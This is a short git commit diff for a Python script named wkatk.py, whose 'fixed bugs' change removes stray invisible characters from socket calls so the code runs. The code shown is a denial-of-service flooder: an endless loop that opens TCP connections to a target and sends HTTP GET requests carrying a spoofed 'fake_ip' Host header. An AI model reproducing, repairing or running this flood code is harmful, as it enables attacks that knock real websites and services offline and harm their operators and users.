c64e107a2e2577e4a8abd5b5d07c464c1cbea757
Moment-ag <67823105+Moment-ag@users.noreply.github.com>
2020-07-05 17:03:23 +0700

    Update wkatk.py
    fixed bugs

--- wkatk.py
+++ wkatk.py
@@ -9,7 +9,7 @@ already_connected = 0
 
 def attack():
     while True:
-        s = socket.​socket(socket.AF_INET, socket.​SOCK_STREAM)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
         s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
         s.sendto(("Host:" + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
